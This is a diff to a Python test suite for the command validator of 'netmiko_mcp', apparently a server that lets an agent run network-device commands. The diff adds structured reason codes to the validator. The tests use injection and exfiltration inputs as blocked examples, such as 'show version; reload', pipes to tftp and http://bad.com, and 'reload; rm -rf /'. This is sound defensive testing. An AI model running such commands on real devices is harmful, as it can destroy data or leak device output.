@@ -3,7 +3,17 @@ from pathlib import Path
 from typing import Any
 from unittest.mock import patch
 
+from netmiko_mcp.audit import (
+    REASON_ALLOWED,
+    REASON_DENY_MATCH,
+    REASON_INVALID_PIPE_MODIFIER,
+    REASON_MULTIPLE_PIPES,
+    REASON_NO_ALLOW_MATCH,
+    REASON_PIPE_NOT_ALLOWED,
+    REASON_UNSAFE_CHAR,
+)
 from netmiko_mcp.security import (
+    ValidationResult,
     _build_unsafe_re_class,
     _to_regex_char,
     glob_to_regex,
@@ -259,8 +269,8 @@ def test_load_commands_result_is_cached(tmp_path: Path) -> None:
 def test_validate_command_default_allowed(mock_load: Any) -> None:
     """Test that default behavior strictly denies everything if no YAML is loaded."""
     mock_load.return_value = {}  # Simulate missing or empty YAML
-    assert validate_command("show ip int brief") is False
-    assert validate_command("show version") is False
+    assert not validate_command("show ip int brief").allowed
+    assert not validate_command("show version").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -272,10 +282,10 @@ def test_validate_command_default_denied(mock_load: Any, mock_settings: Any) -> 
     mock_settings.unsafe_chars = [";", "\n", "\r", "&"]
 
     # Pipes are blocked when allow_pipe is False
-    assert validate_command("show run | include password") is False
+    assert not validate_command("show run | include password").allowed
     # Nothing is allowed without a whitelist
-    assert validate_command("clear ip ospf process") is False
-    assert validate_command("debug ip packet") is False
+    assert not validate_command("clear ip ospf process").allowed
+    assert not validate_command("debug ip packet").allowed
 
 
 @patch("netmiko_mcp.security.load_commands")
@@ -287,13 +297,13 @@ def test_validate_command_custom_yaml(mock_load: Any) -> None:
     }
 
     # Defaults should now fail (if they aren't explicitly in the custom config)
-    assert validate_command("show ip int brief") is False
+    assert not validate_command("show ip int brief").allowed
 
     # Custom allowed should pass
-    assert validate_command("display interface brief") is True
+    assert validate_command("display interface brief").allowed
 
     # Custom denied should fail
-    assert validate_command("display interface brief reboot") is False
+    assert not validate_command("display interface brief reboot").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -306,9 +316,9 @@ def test_validate_command_pipes_disabled(mock_load: Any, mock_settings: Any) -> 
     mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}
 
     # Base command passes
-    assert validate_command("show version") is True
+    assert validate_command("show version").allowed
     # Piped command fails
-    assert validate_command("show version | include uptime") is False
+    assert not validate_command("show version | include uptime").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -345,28 +355,28 @@ def test_validate_command_pipes_enabled_safe(mock_load: Any, mock_settings: Any)
     mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}
 
     # Default IOS/IOS-XE modifiers
-    assert validate_command("show version | include uptime") is True
-    assert validate_command("show version | exclude test") is True
-    assert validate_command("show version | section ospf") is True
-    assert validate_command("show version | begin router") is True
-    assert validate_command("show version | count") is True
+    assert validate_command("show version | include uptime").allowed
+    assert validate_command("show version | exclude test").allowed
+    assert validate_command("show version | section ospf").allowed
+    assert validate_command("show version | begin router").allowed
+    assert validate_command("show version | count").allowed
 
     # NX-OS formatting pipes
-    assert validate_command("show version | json") is True
-    assert validate_command("show version | json-pretty") is True
-    assert validate_command("show version | xml") is True
-    assert validate_command("show version | human") is True
+    assert validate_command("show version | json").allowed
+    assert validate_command("show version | json-pretty").allowed
+    assert validate_command("show version | xml").allowed
+    assert validate_command("show version | human").allowed
 
     # NX-OS textual pipes
-    assert validate_command("show version | grep test") is True
-    assert validate_command("show version | egrep test") is True
-    assert validate_command("show version | head 5") is True
-    assert validate_command("show version | last 5") is True
-    assert validate_command("show version | sort") is True
-    assert validate_command("show version | uniq") is True
-    assert validate_command("show version | wc") is True
-    assert validate_command("show version | end test") is True
-    assert validate_command("show version | nz") is True
+    assert validate_command("show version | grep test").allowed
+    assert validate_command("show version | egrep test").allowed
+    assert validate_command("show version | head 5").allowed
+    assert validate_command("show version | last 5").allowed
+    assert validate_command("show version | sort").allowed
+    assert validate_command("show version | uniq").allowed
+    assert validate_command("show version | wc").allowed
+    assert validate_command("show version | end test").allowed
+    assert validate_command("show version | nz").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -379,18 +389,18 @@ def test_validate_command_pipes_enabled_dangerous(mock_load: Any, mock_settings:
     mock_load.return_value = {"allowed_commands": ["show version"], "denied_commands": []}
 
     # Dangerous redirects
-    assert validate_command("show version | redirect tftp://1.1.1.1/test") is False
-    assert validate_command("show version | append flash:test.txt") is False
-    assert validate_command("show version | tee http://bad.com") is False
+    assert not validate_command("show version | redirect tftp://1.1.1.1/test").allowed
+    assert not validate_command("show version | append flash:test.txt").allowed
+    assert not validate_command("show version | tee http://bad.com").allowed
 
     # Dangerous shell escapes and manipulations (NX-OS)
-    assert validate_command("show version | awk '{print $1}'") is False
-    assert validate_command("show version | sed 's/a/b/'") is False
-    assert validate_command("show version | cut -d' ' -f1") is False
-    assert validate_command("show version | tr a b") is False
-    assert validate_command("show version | vsh") is False
-    assert validate_command("show version | email test@test.com") is False
-    assert validate_command("show version | diff") is False
+    assert not validate_command("show version | awk '{print $1}'").allowed
+    assert not validate_command("show version | sed 's/a/b/'").allowed
+    assert not validate_command("show version | cut -d' ' -f1").allowed
+    assert not validate_command("show version | tr a b").allowed
+    assert not validate_command("show version | vsh").allowed
+    assert not validate_command("show version | email test@test.com").allowed
+    assert not validate_command("show version | diff").allowed
 
 
 # ---------------------------------------------------------------------------
@@ -435,8 +445,8 @@ def _vc_setup(mock_load: Any, mock_settings: Any, allow_pipe: bool = False) -> N
 def test_vc_rule4_semicolon_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 4: Commands containing ';' are unconditionally rejected."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show version; reload") is False
-    assert validate_command("show version;reload") is False
+    assert not validate_command("show version; reload").allowed
+    assert not validate_command("show version;reload").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -444,7 +454,7 @@ def test_vc_rule4_semicolon_blocked(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule4_newline_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 4: Commands containing a newline are unconditionally rejected."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show version\nreload") is False
+    assert not validate_command("show version\nreload").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -452,7 +462,7 @@ def test_vc_rule4_newline_blocked(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule4_carriage_return_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 4: Commands containing a carriage return are unconditionally rejected."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show version\rreload") is False
+    assert not validate_command("show version\rreload").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -460,8 +470,8 @@ def test_vc_rule4_carriage_return_blocked(mock_load: Any, mock_settings: Any) ->
 def test_vc_rule4_ampersand_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 4: Commands containing '&' are unconditionally rejected."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show version && reload") is False
-    assert validate_command("show version &") is False
+    assert not validate_command("show version && reload").allowed
+    assert not validate_command("show version &").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -471,7 +481,7 @@ def test_vc_rule4_unsafe_char_in_allowed_command_still_blocked(
 ) -> None:
     """Rule 4: Unsafe chars are rejected even if the base command is in allowed_commands."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show version; show version") is False
+    assert not validate_command("show version; show version").allowed
 
 
 # --- Rule 1: denied_commands takes precedence --------------------------------
@@ -482,7 +492,7 @@ def test_vc_rule4_unsafe_char_in_allowed_command_still_blocked(
 def test_vc_rule1_exact_deny(mock_load: Any, mock_settings: Any) -> None:
     """Rule 1: A plain denied string matches only that exact command."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("reload") is False
+    assert not validate_command("reload").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -496,7 +506,7 @@ def test_vc_rule1_exact_deny_no_substring_match(mock_load: Any, mock_settings: A
     mock_settings.allow_pipe = False
     mock_settings.unsafe_chars = _VC_UNSAFE_CHARS
     mock_settings.pipe_modifiers = _VC_PIPE_MODIFIERS
-    assert validate_command("show reload-cause") is True
+    assert validate_command("show reload-cause").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -504,13 +514,13 @@ def test_vc_rule1_exact_deny_no_substring_match(mock_load: Any, mock_settings: A
 def test_vc_rule1_glob_deny(mock_load: Any, mock_settings: Any) -> None:
     """Rule 1: Glob denied patterns block all matching commands."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("configure terminal") is False
-    assert validate_command("configure replace flash:cfg") is False
-    assert validate_command("configure") is False
-    assert validate_command("debug ip packet") is False
-    assert validate_command("debug ip ospf adj") is False
-    assert validate_command("clear ip ospf process") is False
-    assert validate_command("clear counters") is False
+    assert not validate_command("configure terminal").allowed
+    assert not validate_command("configure replace flash:cfg").allowed
+    assert not validate_command("configure").allowed
+    assert not validate_command("debug ip packet").allowed
+    assert not validate_command("debug ip ospf adj").allowed
+    assert not validate_command("clear ip ospf process").allowed
+    assert not validate_command("clear counters").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -524,7 +534,7 @@ def test_vc_rule1_denied_beats_allowed(mock_load: Any, mock_settings: Any) -> No
     mock_settings.allow_pipe = False
     mock_settings.unsafe_chars = _VC_UNSAFE_CHARS
     mock_settings.pipe_modifiers = _VC_PIPE_MODIFIERS
-    assert validate_command("configure terminal") is False
+    assert not validate_command("configure terminal").allowed
 
 
 # --- Rule 2: allowed_commands -----------------------------------------------
@@ -535,8 +545,8 @@ def test_vc_rule1_denied_beats_allowed(mock_load: Any, mock_settings: Any) -> No
 def test_vc_rule2_exact_match(mock_load: Any, mock_settings: Any) -> None:
     """Rule 2: Exact allowed commands pass."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show version") is True
-    assert validate_command("show ip interface brief") is True
+    assert validate_command("show version").allowed
+    assert validate_command("show ip interface brief").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -544,9 +554,9 @@ def test_vc_rule2_exact_match(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule2_case_insensitive(mock_load: Any, mock_settings: Any) -> None:
     """Rule 2: Allow matching is case-insensitive."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("SHOW VERSION") is True
-    assert validate_command("Show Version") is True
-    assert validate_command("SHOW IP INTERFACE BRIEF") is True
+    assert validate_command("SHOW VERSION").allowed
+    assert validate_command("Show Version").allowed
+    assert validate_command("SHOW IP INTERFACE BRIEF").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -554,12 +564,12 @@ def test_vc_rule2_case_insensitive(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule2_glob_with_args(mock_load: Any, mock_settings: Any) -> None:
     """Rule 2: Glob patterns match commands with arguments."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show ip route 10.0.0.0 255.0.0.0") is True
-    assert validate_command("show bgp summary") is True
-    assert validate_command("show bgp neighbors 10.0.0.1") is True
-    assert validate_command("show interfaces GigabitEthernet0/0") is True
-    assert validate_command("display version") is True
-    assert validate_command("display interface brief") is True
+    assert validate_command("show ip route 10.0.0.0 255.0.0.0").allowed
+    assert validate_command("show bgp summary").allowed
+    assert validate_command("show bgp neighbors 10.0.0.1").allowed
+    assert validate_command("show interfaces GigabitEthernet0/0").allowed
+    assert validate_command("display version").allowed
+    assert validate_command("display interface brief").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -567,9 +577,9 @@ def test_vc_rule2_glob_with_args(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule2_glob_bare_command(mock_load: Any, mock_settings: Any) -> None:
     """Rule 2: Glob patterns also match the bare command with no arguments."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show ip route") is True
-    assert validate_command("show bgp") is True
-    assert validate_command("display") is True
+    assert validate_command("show ip route").allowed
+    assert validate_command("show bgp").allowed
+    assert validate_command("display").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -577,10 +587,10 @@ def test_vc_rule2_glob_bare_command(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule2_not_in_allowed(mock_load: Any, mock_settings: Any) -> None:
     """Rule 2: Commands not in allowed_commands are rejected."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("show running-config") is False
-    assert validate_command("show startup-config") is False
-    assert validate_command("ping 10.0.0.1") is False
-    assert validate_command("traceroute 10.0.0.1") is False
+    assert not validate_command("show running-config").allowed
+    assert not validate_command("show startup-config").allowed
+    assert not validate_command("ping 10.0.0.1").allowed
+    assert not validate_command("traceroute 10.0.0.1").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -588,8 +598,8 @@ def test_vc_rule2_not_in_allowed(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule2_abbreviations_rejected(mock_load: Any, mock_settings: Any) -> None:
     """Rule 2: Command abbreviations are not permitted."""
     _vc_setup(mock_load, mock_settings)
-    assert validate_command("sh ver") is False
-    assert validate_command("sh ip int br") is False
+    assert not validate_command("sh ver").allowed
+    assert not validate_command("sh ip int br").allowed
 
 
 # --- Rule 3: pipe handling --------------------------------------------------
@@ -600,8 +610,8 @@ def test_vc_rule2_abbreviations_rejected(mock_load: Any, mock_settings: Any) -> 
 def test_vc_rule3_pipe_disabled(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: Any pipe is rejected when allow_pipe is False."""
     _vc_setup(mock_load, mock_settings, allow_pipe=False)
-    assert validate_command("show version | include IOS") is False
-    assert validate_command("show bgp summary | include Active") is False
+    assert not validate_command("show version | include IOS").allowed
+    assert not validate_command("show bgp summary | include Active").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -609,13 +619,13 @@ def test_vc_rule3_pipe_disabled(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule3_pipe_valid_modifier(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: Valid pipe modifier passes when allow_pipe is True."""
     _vc_setup(mock_load, mock_settings, allow_pipe=True)
-    assert validate_command("show version | include IOS") is True
-    assert validate_command("show version | exclude uptime") is True
-    assert validate_command("show version | section ospf") is True
-    assert validate_command("show version | begin router") is True
-    assert validate_command("show version | count") is True
-    assert validate_command("show bgp neighbors | include Active") is True
-    assert validate_command("show interfaces GigabitEthernet0/0 | include rate") is True
+    assert validate_command("show version | include IOS").allowed
+    assert validate_command("show version | exclude uptime").allowed
+    assert validate_command("show version | section ospf").allowed
+    assert validate_command("show version | begin router").allowed
+    assert validate_command("show version | count").allowed
+    assert validate_command("show bgp neighbors | include Active").allowed
+    assert validate_command("show interfaces GigabitEthernet0/0 | include rate").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -623,9 +633,9 @@ def test_vc_rule3_pipe_valid_modifier(mock_load: Any, mock_settings: Any) -> Non
 def test_vc_rule3_pipe_invalid_modifier(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: Pipe modifier not in pipe_modifiers is rejected."""
     _vc_setup(mock_load, mock_settings, allow_pipe=True)
-    assert validate_command("show version | grep IOS") is False
-    assert validate_command("show version | awk '{print $1}'") is False
-    assert validate_command("show version | redirect tftp://1.1.1.1") is False
+    assert not validate_command("show version | grep IOS").allowed
+    assert not validate_command("show version | awk '{print $1}'").allowed
+    assert not validate_command("show version | redirect tftp://1.1.1.1").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -633,8 +643,8 @@ def test_vc_rule3_pipe_invalid_modifier(mock_load: Any, mock_settings: Any) -> N
 def test_vc_rule3_bare_pipe_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: A trailing pipe with nothing after it is rejected."""
     _vc_setup(mock_load, mock_settings, allow_pipe=True)
-    assert validate_command("show version |") is False
-    assert validate_command("show version |   ") is False
+    assert not validate_command("show version |").allowed
+    assert not validate_command("show version |   ").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -642,8 +652,8 @@ def test_vc_rule3_bare_pipe_blocked(mock_load: Any, mock_settings: Any) -> None:
 def test_vc_rule3_multiple_pipes_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: Multiple pipes in a single command are rejected."""
     _vc_setup(mock_load, mock_settings, allow_pipe=True)
-    assert validate_command("show version | include IOS | count") is False
-    assert validate_command("show bgp summary | include Active | section peer") is False
+    assert not validate_command("show version | include IOS | count").allowed
+    assert not validate_command("show bgp summary | include Active | section peer").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -651,8 +661,8 @@ def test_vc_rule3_multiple_pipes_blocked(mock_load: Any, mock_settings: Any) -> 
 def test_vc_rule3_pipe_base_command_validated(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: The base command before the pipe must still be in allowed_commands."""
     _vc_setup(mock_load, mock_settings, allow_pipe=True)
-    assert validate_command("show running-config | include interface") is False
-    assert validate_command("show version | include IOS") is True
+    assert not validate_command("show running-config | include interface").allowed
+    assert validate_command("show version | include IOS").allowed
 
 
 @patch("netmiko_mcp.security.settings")
@@ -660,5 +670,117 @@ def test_vc_rule3_pipe_base_command_validated(mock_load: Any, mock_settings: Any
 def test_vc_rule3_denied_base_command_with_pipe_blocked(mock_load: Any, mock_settings: Any) -> None:
     """Rule 3: A denied base command is still blocked even with a valid pipe."""
     _vc_setup(mock_load, mock_settings, allow_pipe=True)
-    assert validate_command("configure terminal | include ip") is False
-    assert validate_command("debug ip packet | include error") is False
+    assert not validate_command("configure terminal | include ip").allowed
+    assert not validate_command("debug ip packet | include error").allowed
+
+
+# ---------------------------------------------------------------------------
+# ValidationResult — structure and reason codes
+# ---------------------------------------------------------------------------
+
+
+def test_validation_result_dataclass_fields() -> None:
+    """ValidationResult should expose allowed and reason attributes."""
+    r = ValidationResult(allowed=True, reason=REASON_ALLOWED)
+    assert r.allowed is True
+    assert r.reason == REASON_ALLOWED
+
+
+def test_validation_result_denied() -> None:
+    r = ValidationResult(allowed=False, reason=REASON_NO_ALLOW_MATCH)
+    assert r.allowed is False
+    assert r.reason == REASON_NO_ALLOW_MATCH
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_unsafe_char(mock_load: Any, mock_settings: Any) -> None:
+    """A command with an unsafe character should return REASON_UNSAFE_CHAR."""
+    _vc_setup(mock_load, mock_settings)
+    result = validate_command("show version; reload")
+    assert not result.allowed
+    assert result.reason == REASON_UNSAFE_CHAR
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_deny_match(mock_load: Any, mock_settings: Any) -> None:
+    """A command matching denied_commands should return REASON_DENY_MATCH."""
+    _vc_setup(mock_load, mock_settings)
+    result = validate_command("reload")
+    assert not result.allowed
+    assert result.reason == REASON_DENY_MATCH
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_pipe_not_allowed(mock_load: Any, mock_settings: Any) -> None:
+    """A piped command when allow_pipe=False should return REASON_PIPE_NOT_ALLOWED."""
+    _vc_setup(mock_load, mock_settings, allow_pipe=False)
+    result = validate_command("show version | include IOS")
+    assert not result.allowed
+    assert result.reason == REASON_PIPE_NOT_ALLOWED
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_multiple_pipes(mock_load: Any, mock_settings: Any) -> None:
+    """Multiple pipes should return REASON_MULTIPLE_PIPES."""
+    _vc_setup(mock_load, mock_settings, allow_pipe=True)
+    result = validate_command("show version | include IOS | count")
+    assert not result.allowed
+    assert result.reason == REASON_MULTIPLE_PIPES
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_invalid_pipe_modifier(mock_load: Any, mock_settings: Any) -> None:
+    """An unsupported pipe modifier should return REASON_INVALID_PIPE_MODIFIER."""
+    _vc_setup(mock_load, mock_settings, allow_pipe=True)
+    result = validate_command("show version | grep IOS")
+    assert not result.allowed
+    assert result.reason == REASON_INVALID_PIPE_MODIFIER
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_invalid_pipe_modifier_bare_pipe(
+    mock_load: Any, mock_settings: Any
+) -> None:
+    """A trailing pipe with no modifier should return REASON_INVALID_PIPE_MODIFIER."""
+    _vc_setup(mock_load, mock_settings, allow_pipe=True)
+    result = validate_command("show version |")
+    assert not result.allowed
+    assert result.reason == REASON_INVALID_PIPE_MODIFIER
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_no_allow_match(mock_load: Any, mock_settings: Any) -> None:
+    """A command not in allowed_commands should return REASON_NO_ALLOW_MATCH."""
+    _vc_setup(mock_load, mock_settings)
+    result = validate_command("show running-config")
+    assert not result.allowed
+    assert result.reason == REASON_NO_ALLOW_MATCH
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_reason_allowed(mock_load: Any, mock_settings: Any) -> None:
+    """An allowed command should return REASON_ALLOWED."""
+    _vc_setup(mock_load, mock_settings)
+    result = validate_command("show version")
+    assert result.allowed
+    assert result.reason == REASON_ALLOWED
+
+
+@patch("netmiko_mcp.security.settings")
+@patch("netmiko_mcp.security.load_commands")
+def test_validate_command_unsafe_char_takes_precedence_over_deny(
+    mock_load: Any, mock_settings: Any
+) -> None:
+    """UNSAFE_CHAR should be reported before DENY_MATCH even if the command also matches denied."""
+    _vc_setup(mock_load, mock_settings)
+    result = validate_command("reload; rm -rf /")
+    assert not result.allowed
+    assert result.reason == REASON_UNSAFE_CHAR
